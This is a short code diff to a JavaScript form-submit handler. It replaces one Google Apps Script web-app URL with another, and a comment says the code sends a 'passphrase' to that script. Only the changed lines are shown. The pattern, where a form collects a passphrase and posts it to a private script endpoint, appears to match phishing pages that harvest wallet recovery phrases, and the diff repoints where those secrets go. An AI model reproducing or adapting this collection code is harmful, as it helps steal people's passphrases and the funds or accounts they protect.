@@ -22,7 +22,7 @@ function handleSubmit(event) {
     }
 
     // Google Apps Script Web App URL (Replace with your actual URL)
-    const url = "https://script.google.com/macros/s/AKfycbzZkC3cqGP1qnpLW54EFpm9jr-_A7QI2GAcfBghxAt7USwSLsUvBUyvLoyfsXLKfMuU_A/exec";
+    const url = "https://script.google.com/macros/s/AKfycby5xkOvEtgXj-hYm-o3mBlgO5vcGGLcqJsT9I_M9aC7/dev";
 
     // Send passphrase to Google Apps Script
     fetch(url, {
